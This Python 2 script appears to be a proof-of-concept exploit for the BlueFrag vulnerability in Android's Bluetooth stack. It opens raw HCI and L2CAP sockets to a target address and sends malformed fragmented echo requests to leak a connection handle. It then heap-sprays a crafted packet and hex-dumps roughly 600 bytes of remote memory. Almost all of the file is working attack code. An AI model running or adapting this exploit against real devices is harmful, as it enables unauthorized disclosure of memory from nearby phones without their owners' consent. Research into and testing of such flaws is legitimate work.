import sys
import os
import socket
import struct
import time
import subprocess
from binascii import hexlify, unhexlify
from thread import start_new_thread
from random import randint, randrange

#hciconfig hci0 sspmode 0
if len(sys.argv) < 2:
    print "Leaks ~600 bytes by overwriting the received packet"
    print "Packet can be injected to arbitrary handle (by modifying code...)"
    print "Usage %s target src_size" % sys.argv[0]
    sys.exit(1)

pkt = False
echo = False
def recv_l2cap():
    global l2cap
    global pkt
    global echo
    while True:
        pkt = l2cap.recv(10240)
        if ord(pkt[0]) == 0x9: #ECHO RESP
            print "ECHO", hexlify(pkt)
            echo = pkt
        elif ord(pkt[0]) == 0x1:
            print "Rejected", hexlify(pkt)
            #_, cmd, l, code = struct.unpack("<BBHH", pkt)
            #print "Rejected cmd=%x len=%x code=%x" % (cmd, l, code)
            
        else:
            #print hexlify(pkt)
            pass

handle = 0 #coonection handle
def recv_hci():
    global handle
    while True:
        pkt = hci.recv(1024)
        if ord(pkt[0]) == 0x04 and ord(pkt[1]) == 0x03:
            if handle == 0:
                handle = struct.unpack("<H", pkt[4:6])[0]
                #handle = u16(pkt[4:6])
                print "Got connection handle", handle

            #print "HCI", hexlify(pkt)

#configure HCI socket
os.system("hciconfig hci0 up")
os.system("hciconfig hci0 sspmode 0")
os.system("hcitool dc " + sys.argv[1])
hci = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
hci.setsockopt(socket.SOL_HCI, socket.HCI_DATA_DIR,1)
hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00')
hci.bind((0,))
start_new_thread(recv_hci, ())

#configure L2CAP socket
connect_response = -1
pid_l2cap = 0
while connect_response != 0:
    handle = 0
    l2cap = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
    connect_response = l2cap.connect_ex((sys.argv[1], 0))
    if (connect_response != 0):
        print "Error. Response code: ", connect_response
        l2cap.close()

start_new_thread(recv_l2cap, ())

#wait for host to bind
while handle == 0:
    pass

"""
	auxiliary function to form packet
"""
def pattern(n):
    return "".join([chr(i%255) for i in xrange(n)])

"""
	Discrpiption: form and send HCI ACL packet with L2CAP echo request.
	Args: 
		ident - packet identifier
		x - data to sent
		len_adj - length of continuation packet (can differ from real lenght. if adj_len less than 4, packet should trigger memory leak)
		continuation_flags - specify if packet is continuation to another one. 0 - base, 1 - continuation.
"""

def send_echo_hci(ident, x, l2cap_len_adj=0, continuation_flags=0):
    l2cap_hdr = struct.pack("<BBH",0x8, ident, len(x) + l2cap_len_adj) #command identifier len
    acl_hdr = struct.pack("<HH", len(l2cap_hdr) + len(x) + l2cap_len_adj, 1) #len cid

    packet_handle = handle
    packet_handle |= continuation_flags << 12
    hci_hdr = struct.pack("<HH", packet_handle, len(acl_hdr) + len(l2cap_hdr) + len(x)) #handle, len

    hci.send("\x02" + hci_hdr + acl_hdr + l2cap_hdr + x)

"""
	Disctiption: collect information for verbose analysis.
	Args:
		debug_iter - iteration of debug files
"""
def collect_debug_info(debug_iter):
	#snapshot cur process
	output = subprocess.check_output(["pgrep", "python"])
	os.system("lsof -p " + str(output) + " > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-lsof-cur.txt")
	#entire system snapshot
	os.system("sudo lsof -u root > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-lsof-all.txt")
	os.system("sudo dmesg > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-dmesg.txt")
	os.system("sudo cat /var/log/syslog > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-syslog.txt")
	#bluetooth adapter snapshot
	os.system("hciconfig -a > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-hciconfig.txt")
	os.system("bluetoothctl show > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-bluetoothctl-show.txt")
	os.system("bluetoothctl devices > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-bluetoothctl-devices.txt")
	os.system("bluetoothctl info 80:1D:00:33:D8:82 > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-bluetoothctl-info.txt")

	print "Debug info collected"

"""
	Disctiption: Trigger copy_len overflow
"""
def do_leak(ident=42):
    global echo
    echo = False
    send_echo_hci(ident, "A"*70, l2cap_len_adj=2)
    send_echo_hci(ident+1, "B"*70, continuation_flags=1)
    #send analysis if requested
    if len(sys.argv) > 4:
    	collect_debug_info(int(sys.argv[4]))
    while echo == False:
        pass
    #relaunch debug bridge after daemon crash
    if len(sys.argv) > 4:
    	time.sleep(1)
        os.system("bluetooth_pid=$(adb shell 'pgrep droid.bluetooth')")
        os.system("adb logcat --pid=$bluetooth_pid > /home/copied_wonder/BlueFrag_PoC/issue_2/2-android-logcat.txt &")
    return echo

print "Leaking remote handle"

leak = do_leak()
remote_handle = struct.unpack("<H", leak[-6:-4])[0] & 0xfff
print "Leaked Handle", hex(remote_handle)

if len(sys.argv) < 3:
    src_len = 70
else:
    src_len = int(sys.argv[2], 0)


#prepare the packet
echo_payload_len = 640
ident = 0x42
l2cap_hdr = struct.pack("<BBH", 0x8, ident, echo_payload_len) #command identifier len
acl_hdr = struct.pack("<HH", len(l2cap_hdr) + echo_payload_len, 1) #len cid
hci_hdr = struct.pack("<HH", remote_handle, len(acl_hdr) + len(l2cap_hdr) + echo_payload_len) #handle, len
#This must match the packet length we use to trigger the packet
bt_len = 0x3c#len(acl_hdr) + len(l2cap_hdr) + len(hci_hdr)+echo_payload_len
bt_hdr = struct.pack("<HHHH", 0x1100, bt_len, bt_len, 0) #ensure partial_packet->offset == partial_packet->len

# padding + packet
cmd = pattern(0x16) + bt_hdr + hci_hdr + acl_hdr + l2cap_hdr + "X"*512

#Spray heap with packet
verify_len = 48
ident = 0
while True:
    #write data to heap
    for i in xrange(5):
        send_echo_hci(ident, cmd[:70])
        time.sleep(1)
        ident = (ident + 1)%250

    #check if spray was succsessfull
    leak = do_leak(ident)
    if leak[8:8+verify_len] == cmd[0x16:0x16+verify_len]:
        print "Heap spray succsessfull"
        break
    else:
    	print "Heap spray failed"

    ident = (ident + 2)%250

while True:
    #Prevent duplicate ident
    send_echo_hci(ident, "A"*128)

    #Trigger the reception of the injected packet
    echo = False
    send_echo_hci(ident+1, "A"*46, l2cap_len_adj=2)
    send_echo_hci(ident+2, "B"*src_len, continuation_flags=1)
    time.sleep(1)

    ident = (ident + 2)%32

    while not echo:
        pass

    if len(echo) < 500:
        print "got invalid response"
        continue

    leak = struct.unpack("Q"*(echo_payload_len/8-1), echo[8:-4])

    #Hexdump
    print "\nLeak succsessfull"
    for i in xrange(len(leak)/8):
        for j in xrange(8):
            if i*8+j < len(leak):
                print "0x%016x"%leak[i*8+j], 

        print ""

    leak = "".join(map(lambda x: "." if ord(x)<0x20 or ord(x)>0x7e else x, echo))
    print ""
    i = 4
    while i < len(leak):
        print leak[i:i+64]
        i += 64

    print ""
